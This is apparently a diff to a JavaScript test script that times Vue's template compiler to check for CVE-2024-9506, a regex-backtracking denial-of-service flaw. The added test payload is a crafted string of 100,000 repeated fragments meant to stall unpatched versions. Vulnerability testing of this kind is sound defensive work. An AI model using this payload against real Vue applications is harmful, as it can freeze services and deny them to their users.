@@ -1,20 +1,19 @@
 function runTest() {
-  if (!window.Vue) {
-    const red = '\x1b[31m',
-      reset = '\x1b[0m'
-    console.error(`${red}Vue is not available.${reset}`)
+  const red = '\x1b[31m'
+  const green = '\x1b[32m'
+  const yellow = '\x1b[33m'
+  const cyan = '\x1b[36m'
+  const reset = '\x1b[0m'
+
+  if (!window.Vue || typeof Vue.compile !== 'function') {
+    console.error(`${red}Vue is not available or compile() missing.${reset}`)
     return
   }
 
-  const cyan = '\x1b[36m',
-    reset = '\x1b[0m'
   console.log(`[test patch] ${cyan}Vue version:${reset}`, Vue.version)
 
-  const payload = `
-    <div>
-      <script>${'<'.repeat(100000)}</textarea>
-    </div>
-  `
+  // ⛔️ Malicious input that causes regex backtracking in unpatched versions
+  const payload = '<script>' + ' </'.repeat(100000) + '<\\/script>'
 
   let capturedMessage = ''
 
@@ -33,21 +32,17 @@ function runTest() {
 
   const duration = performance.now() - start
 
-  const yellow = '\x1b[33m'
   if (capturedMessage) {
-    console.warn(`${yellow}[Compile Warning]\x1b[0m ${capturedMessage}`)
+    console.warn(`${yellow}[Compile Warning]${reset} ${capturedMessage}`)
   }
 
-  console.log(`${cyan} Time:${reset}`, duration.toFixed(2), 'ms')
+  console.log(`${cyan}Time:${reset} ${duration.toFixed(2)} ms`)
 
-  const red = '\x1b[31m'
-  const green = '\x1b[32m'
-
-  console.log(
-    duration > 1000
-      ? `${red}VULNERABLE - CVE-2024-9506 triggered${reset}`
-      : `${green} Not vulnerable (fast parse)${reset}`
-  )
+  if (duration > 1000) {
+    console.error(`${red}VULNERABLE - CVE-2024-9506 triggered${reset}`)
+  } else {
+    console.log(`${green}Not vulnerable (fast parse)${reset}`)
+  }
 }
 
 function suppressAndCapture(fn, onMsg) {
@@ -55,19 +50,15 @@ function suppressAndCapture(fn, onMsg) {
   const originalError = console.error
 
   console.warn = (msg, ...args) => {
-    const red = '\x1b[31m',
-      reset = '\x1b[0m'
     if (typeof msg === 'string' && msg.includes('Error compiling template')) {
-      msg = `${red}${msg}${reset}`
+      msg = `\x1b[31m${msg}\x1b[0m`
     }
     if (typeof onMsg === 'function') onMsg(msg)
   }
 
   console.error = (msg, ...args) => {
-    const red = '\x1b[31m',
-      reset = '\x1b[0m'
     if (typeof msg === 'string' && msg.includes('Error compiling template')) {
-      msg = `${red}${msg}${reset}`
+      msg = `\x1b[31m${msg}\x1b[0m`
     }
     if (typeof onMsg === 'function') onMsg(msg)
   }
